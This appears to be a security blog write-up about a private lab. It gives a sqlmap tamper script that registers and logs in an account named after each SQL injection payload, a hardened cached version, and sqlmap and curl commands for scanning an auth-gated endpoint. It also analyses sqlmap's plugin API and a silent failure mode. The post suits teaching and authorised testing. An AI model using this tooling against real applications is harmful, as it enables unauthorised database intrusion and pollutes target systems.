---
title: "Tamper: A SQLMap Tamper Script for Auth-Gated SQL Injection"
description: "A private SQLi lab put the injectable parameter behind a signup and login form, so sqlmap needed an account before it could test anything. The result is a tamper plugin that creates the account, logs in, and attaches the session to every request, plus a study of the sqlmap plugin API and the silent failure that makes it lie to you."
difficulty: "Medium"
tags: ["SQL Injection", "SQLMap", "Tamper Script", "Python", "Authentication", "Web Exploitation", "Tooling"]
date: "2026-05-28"
---

## Overview

This entry is different from the others on this site. There is no TryHackMe room here and no flags to collect: the folder documents a **private SQL injection lab**, reachable only on an internal range, and the actual deliverable was a piece of tooling rather than a foothold.

The lab's injection point is behind a signup and login form. That is the ordinary state of affairs in real applications — most interesting parameters are only reachable once you have an account — but it is a state that a scanner does not handle on its own. sqlmap replays one request and compares responses; if every replay lands on the login page, every response is identical, and sqlmap concludes the parameter is not injectable. The conclusion is wrong, and there is no error message to tell you so.

The answer was a custom `--tamper` plugin: a short script that creates an account whose username is the payload, logs in as that user, and puts the resulting session cookie on the request sqlmap is about to send. It returns the payload untouched, so it is not a tamper in the usual sense — it is an authentication harness wearing a tamper script's clothes.

That makes it a good excuse to look at how sqlmap's plugin API actually works, at where the hook is called from, and at the fragile parts of using it for stateful work. Everything below is grounded in the sqlmap source, and the measurements come from a local mock of the login gate that I built to test both versions of the script.

The target, for completeness, is `http://10.82.154.211:5000/challenge4`, a private range address that does not respond from outside that network today.

## Room Information

| Field | Value |
|-------|-------|
| Platform | Private lab (not TryHackMe) |
| Target | `http://10.82.154.211:5000/challenge4` |
| Category | Web exploitation / tooling |
| Difficulty | Not published — Medium reflects the custom scripting, not a platform rating |
| Artefacts | `so-tamper.py` (29 lines), empty `__init__.py` |
| Status | Completed; the host is no longer reachable |
| Techniques | SQL injection behind authentication, sqlmap plugin development, session management |

## The Problem, Stated Plainly

sqlmap's model of the world is that a request is self-contained. You give it a URL, it finds the parameter, and it sends variations of that parameter and looks at what comes back. That model is what makes it fast and what makes it fail on authenticated applications.

With the injection behind a login, the scan goes like this:

```text
probe 1  -> 302 /login  (anonymous)
probe 2  -> 302 /login  (anonymous)
probe 3  -> 302 /login  (anonymous)
...
sqlmap: "all tested parameters do not appear to be injectable"
```

Every response is byte-identical, so there is nothing to compare. The tool is not broken and the parameter may be perfectly injectable — the scanner simply never reached the code that evaluates it.

There are four ways out, in increasing order of effort:

1. **Reuse a session you already have** with `--cookie="session=..."`. This is the right answer when one account is enough and the cookie does not expire mid-scan.
2. **Let sqlmap log in for you** with `--auth-type=Basic --auth-cred=user:pass` for HTTP authentication, or `--auth-file` for a cookie jar.
3. **Write a form-login macro** with `--forms` or by scripting a login and feeding the cookie back in, if the login is a one-off.
4. **Hook every request**, which is what this folder does — necessary only when the account has to be derived from the payload itself.

That last condition is the interesting one. In this lab the account name *is* the payload, so a fixed session cannot satisfy the application; a fresh account has to exist for every distinct payload sqlmap tries. That is the situation a tamper script fits.

## How sqlmap Tamper Scripts Actually Work

A tamper script is a Python module that sqlmap imports and then calls before it sends a request. The contract is small, and most of it is enforced by the loader in `lib/core/option.py`:

- **The file lives in a directory containing `__init__.py`.** sqlmap resolves `--tamper=so-tamper.py` by looking first in its own `tamper/` directory, and then treating the value as a path. Either way it requires an empty `__init__.py` beside the script, inserts that directory into `sys.path`, and imports the module by filename. Without it you get *"make sure that there is an empty file `__init__.py` inside of tamper scripts directory"*. That is what the zero-byte `__init__.py` in this folder is for — it is not decoration.
- **The module must define `tamper(payload, **kwargs)`.** The loader inspects the module for exactly that function, with `payload` plus a `**kwargs` catch-all. If it is missing, the load fails outright.
- **The module may define `dependencies()`.** If present, it is called once at load time, and raising from it aborts the scan. It is the place to check for a missing library or an unreachable target.
- **`__priority__` orders chained tampers.** The real constants are `LOWEST = -100`, `LOWER = -50`, `LOW = -10`, `NORMAL = 0`, `HIGH = 10`, `HIGHER = 50`, `HIGHEST = 100`. If the order on the command line contradicts the priorities, sqlmap warns that you may have mixed them up and offers to re-sort. More than three tampers triggers a warning of its own.

The call site is in `lib/request/connect.py`, immediately before the request is built:

```python
if payload:
    delimiter = conf.paramDel or (DEFAULT_GET_POST_DELIMITER if place != PLACE.COOKIE else DEFAULT_COOKIE_DELIMITER)

    if not disableTampering and kb.tamperFunctions:
        for function in kb.tamperFunctions:
            hints = {}

            try:
                payload = function(payload=payload, headers=auxHeaders, delimiter=delimiter, hints=hints)
            except Exception as ex:
                errMsg = "error occurred while running tamper "
                errMsg += "function '%s' ('%s')" % (function.__name__, getSafeExString(ex))
                raise SqlmapGenericException(errMsg)

            if not isinstance(payload, six.string_types):
                errMsg = "tamper function '%s' returns " % function.__name__
                errMsg += "invalid payload type ('%s')" % type(payload)
                raise SqlmapValueException(errMsg)
```

Four consequences follow directly from those twenty lines:

1. **It only runs when there is a payload.** `if payload:` guards the whole block, so the hook fires on injection attempts, not on every request sqlmap makes.
2. **`headers` is the live dict.** sqlmap passes the same `auxHeaders` object it later sends, which is why mutating it inside the function changes the outgoing request. This is the mechanism the whole script depends on.
3. **The return value must be a string.** Returning `None` — a very easy mistake when a helper function forgets to return — raises `SqlmapValueException`.
4. **Exceptions are caught and re-raised with context.** A `requests` timeout or an assertion failure inside your script appears as *"error occurred while running tamper function 'so-tamper' (...)"*. That is the good failure mode, and it is the one this script does not use.

There is also a newer `hints` dict that lets a tamper add parameters before or after the payload (`HINT.PREPEND`, `HINT.APPEND`), which is irrelevant here but explains the fourth argument.

## The Script

Here is the file as it was written, unchanged:

```python
#!/usr/bin/python3
import requests
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

address = "http://10.82.154.211:5000/challenge4"
password = "asd"

def dependencies():
    pass

def create_account(payload):
    with requests.Session() as s:
        data = {"username": payload, "password": password}
        s.post(f"{address}/signup", data=data)

def login(payload):
    with requests.Session() as s:
        data = {"username": payload, "password": password}
        s.post(f"{address}/login", data=data)
        sessid = s.cookies.get("session", None)
    return f"session={sessid}"

def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    create_account(payload)
    headers["Cookie"] = login(payload)
    return payload
```

Line by line:

**`address` and `password` are constants.** The password `asd` is the same for every account the script creates; that is fine for a lab, and it is worth noticing how much of the script's reliability depends on that assumption.

**`create_account` opens its own `Session` and ignores the response.** It posts the payload as the username and the fixed password to `/signup`. Ignoring the response is deliberate-ish: a second signup for the same username may return `409`, and the script does not care, because the account only needs to exist once.

**`login` opens a second, separate `Session`.** It posts the same pair to `/login`, then reads the `session` cookie out of that session's jar before the `with` block closes. The return value is a complete `Cookie` header value, `session=<token>` — not just the token.

Two sessions for one account looks wrong, and would be wrong if registration handed out state that login depended on (a CSRF token bound to the session, for instance). It works here because the account lives in the database on the server side: session one creates the row, session two authenticates against it. That is an assumption, and it is invisible in the code.

**`tamper` is the glue.** It pulls the header dict out of `kwargs`, calls the two helpers, writes the `Cookie` header into that dict, and returns the payload unchanged.

The unchanged return is the part that confuses people. Tamper scripts are usually encoders — `space2comment`, `charencode`, `base64encode` — that rewrite the SQL so a filter does not recognise it. This one rewrites nothing. It is using the hook for its side effect: sqlmap gives plugins a moment before every payload-bearing request, and the script spends that moment authenticating.

![Diagram of the tamper hook: sqlmap builds the request, calls tamper(), the script creates an account and logs in, the cookie is written into the live header dict, and the request is sent](/assets/screenshots/tamper/hook-flow.svg)

One subtlety worth spelling out: because the account name is the payload, the payload is sent three times per probe — once in the signup `POST`, once in the login `POST`, and once to the actual endpoint. If the signup or login query is itself injectable (a real possibility in a challenge like this), the injection is being exercised in all three places, and only one of them is the request sqlmap is measuring.

## The Failure Mode That Matters

```python
sessid = s.cookies.get("session", None)
...
return f"session={sessid}"
```

If login fails — wrong password, a `403` from a rate limiter, a `500` because the account creation raced, a `409` because the username already exists and the password differs — `s.cookies.get` returns `None`. String formatting then produces:

```text
Cookie: session=None
```

No exception. No warning. sqlmap sends the request anonymously, receives the login page, compares it with the previous login page, finds them identical, and reports that the parameter is not injectable. The operator reads that as "this endpoint is safe" and moves on.

I reproduced this against a local mock of the gate with the login path deliberately broken, and the script's output was exactly that: `Cookie sent: 'session=None'`.

![Diagram of the silent failure: a failed login yields session=None, the server treats the request as anonymous, every probe returns the same page, and sqlmap concludes the parameter is not injectable](/assets/screenshots/tamper/silent-failure.svg)

This is the most valuable thing in the folder, because it is a bug class rather than a bug. A tool that fails loudly gets fixed; a tool that fails into a plausible-looking negative result sends you looking in the wrong place. Any script that transforms credentials into a header should assert that it has something to put there.

## The Cost

The script authenticates on every payload-bearing request, and that is two extra HTTP requests each time: one `POST /signup`, one `POST /login`. Against the local mock, two identical payloads produced two signups and two logins — four extra requests for two probes — and the session token changed between them, because each call creates a new account session rather than reusing the last one.

Scale that up. A time-based blind scan of a single short string is hundreds to thousands of requests. Doubling or tripling that is bad enough; tripling it when each request can contain a `sleep(1)` is much worse, because a time-based probe deliberately waits.

| Workload | Extra auth requests |
|----------|--------------------|
| 6 probes, original script | 12 (signup + login, every probe) |
| 6 probes, cached script | 2 (once per distinct payload) |
| same 6 probes again, cached | 0 |

There is a second cost that does not show up in a request count: every probe **creates a row**. A blind scan can leave thousands of accounts behind, which pollutes the database, bloats logs, and may trip a rate limit or a uniqueness rule halfway through the scan. On a lab box that is untidy; on a client's staging environment it is the kind of side effect you have to disclose.

## A Hardened Version

Four changes fix the failure mode and most of the cost: check the signup response, check the login response, refuse to continue without a cookie, and cache the session per payload.

```python
#!/usr/bin/env python3
"""Authenticated session harness for an auth-gated SQL injection point."""

import requests
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGH

ADDRESS = "http://10.82.154.211:5000/challenge4"
PASSWORD = "asd"
TIMEOUT = 15

_cookies = {}  # injected payload -> session token

def dependencies():
    """Called by sqlmap once at load time."""
    pass

def _authenticate(username):
    with requests.Session() as s:
        r = s.post(
            f"{ADDRESS}/signup",
            data={"username": username, "password": PASSWORD},
            timeout=TIMEOUT,
        )
        if r.status_code not in (200, 201, 302, 409):
            raise RuntimeError(f"signup failed for {username!r}: HTTP {r.status_code}")

        r = s.post(
            f"{ADDRESS}/login",
            data={"username": username, "password": PASSWORD},
            timeout=TIMEOUT,
        )
        if r.status_code != 200:
            raise RuntimeError(f"login failed for {username!r}: HTTP {r.status_code}")

        cookie = s.cookies.get("session")
        if not cookie:
            raise RuntimeError(f"login returned no session cookie for {username!r}")
        return cookie

def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    cookie = _cookies.get(payload)
    if cookie is None:
        cookie = _authenticate(payload)
        _cookies[payload] = cookie
    headers["Cookie"] = f"session={cookie}"
    return payload
```

Why each change earns its place:

| Change | Reason |
|--------|--------|
| `409` accepted on signup | The account already existing is the desired end state, not an error. Any other status means the account was *not* created and the scan would proceed blind. |
| Status check on login | The difference between "logged in" and "not logged in" is a status code, not an exception. `requests` raises nothing for a `401`. |
| `raise RuntimeError` when the cookie is missing | Converts a silent wrong answer into sqlmap's loud `error occurred while running tamper function` message, with the payload in it. |
| `timeout=TIMEOUT` | A hung login otherwise stalls the whole scan with no indication of which request is stuck. |
| `_cookies` keyed by payload | Alternating boolean payloads are the normal access pattern, and a single-slot cache would thrash. A dict keeps one session per distinct payload, which is exactly the granularity the application requires. |

I tested the cached version against the same mock: six alternating probes produced two signups and two logins, and the next six produced none, with every request carrying a valid session.

Two things the hardened version still does not do, on purpose:

- **No expiry handling.** If the application invalidates sessions after a timeout, a cached token will start failing mid-scan and sqlmap will see anonymous pages again. Add a timestamp per entry and re-authenticate after, say, five minutes, if the target behaves that way.
- **No cap on what it creates.** It still writes a database row per distinct payload. Nothing inside a tamper script can avoid that if the application requires it; it is a side effect to be aware of and to mention in a report.

## Running It

```bash
# from a directory that contains so-tamper.py and an empty __init__.py
sqlmap -u "http://10.82.154.211:5000/challenge4/<endpoint>?<param>=1" \
       --tamper=so-tamper.py \
       --batch -v 3
```

`-v 3` prints each payload as it is sent, which is how you confirm the script is working: if the account creation is silently failing, the payloads still appear but the responses are all the login page. The `__init__.py` matters here — without it sqlmap refuses to load the plugin even though the path is correct.

When a single fixed account is enough, skip the plugin entirely and do it by hand:

```bash
curl -s -c jar -d 'username=probe&password=asd' http://10.82.154.211:5000/challenge4/signup
curl -s -c jar -b jar -d 'username=probe&password=asd' http://10.82.154.211:5000/challenge4/login

sqlmap -u "http://10.82.154.211:5000/challenge4/<endpoint>?<param>=1" \
       --cookie="session=$(awk '/session/{print $7}' jar)" --batch
```

That is one request instead of three per probe, no side effects, and no custom code to debug. A tamper script is the right tool only when the session genuinely has to depend on the payload.

## What This Folder Does Not Record

Being explicit about the gaps, since the rest of this site's posts are backed by scan output and captured flags:

- **No scan output.** There is no sqlmap log, no request/response capture, and no record of which parameter was injected or which technique succeeded.
- **No flags or credentials recovered.** Nothing in the folder records a successful extraction, so none is claimed here.
- **No screenshots.** The two figures in this post are diagrams I drew from the sqlmap source and from testing, not captures of the original run.
- **The target is offline.** A request to `10.82.154.211:5000` from this network returns nothing, so the challenge cannot be replayed as written.
- **The completion date is inferred** from the folder's file timestamps (28 May 2026), not from a recorded date.

What *is* fully verifiable is the code in this folder and the behaviour of the sqlmap API it relies on, which is what the post concentrates on.

## Lessons Learned

- **Authentication is a scanning problem before it is an exploitation problem.** Most parameters worth attacking sit behind a login. Deciding up front how the scanner will hold a session — cookie, auth file, macro, or hook — is the difference between a scan that works and a scan that lies.
- **"Not injectable" is a conclusion, not an observation.** Identical responses can mean the parameter is safe, and can mean the scanner never authenticated. Before believing the negative result, confirm what the scanner was actually requesting.
- **Tamper scripts are arbitrary code, not just encoders.** The API is "a function called before every payload-bearing request with the live header dict". That is general enough to do authentication, rate-limit handling, or request signing — and general enough to hide bugs.
- **The silent `None` is the dangerous bug.** `session=None` produced no exception, no warning, and a wrong answer that looked authoritative. Failing loudly inside a scanner plugin is a feature, not rudeness.
- **Caching changes the cost by an order of magnitude.** Two auth requests per probe becomes two per distinct payload. The difference between a scan that finishes and one you abandon.
- **Plugins have side effects the target can see.** Every probe created an account. On a live system that is database growth, log noise, and possibly a breach of the engagement's rules; on a lab box it is just untidy.
- **Read the loader before writing the plugin.** The empty `__init__.py`, the required function name, the `**kwargs` signature, the priority values, the exception wrapping — all of it is visible in `option.py` and `connect.py`, and knowing it turns a mysterious import failure into a two-line fix.
- **Prefer the boring mechanism when it fits.** `--cookie` with a session you obtained by hand is one request per probe and no code. The tamper hook was justified only because the account had to match the payload.

## References

- [sqlmap — GitHub repository](https://github.com/sqlmapproject/sqlmap)
- [sqlmap — working with tamper scripts (wiki)](https://github.com/sqlmapproject/sqlmap/wiki/Usage#tamper-script)
- [sqlmap — usage documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [ExploitDB 46635 — CMS Made Simple SQL injection (a typical tamper consumer)](https://www.exploit-db.com/exploits/46635)
- [Requests — advanced session objects](https://requests.readthedocs.io/en/latest/user/advanced/#session-objects)
- [Python — `importlib` and module loading](https://docs.python.org/3/library/importlib.html)

*Figures 1 and 2 are original diagrams for this post. No screenshots existed in the room folder, and the target host is no longer reachable.*
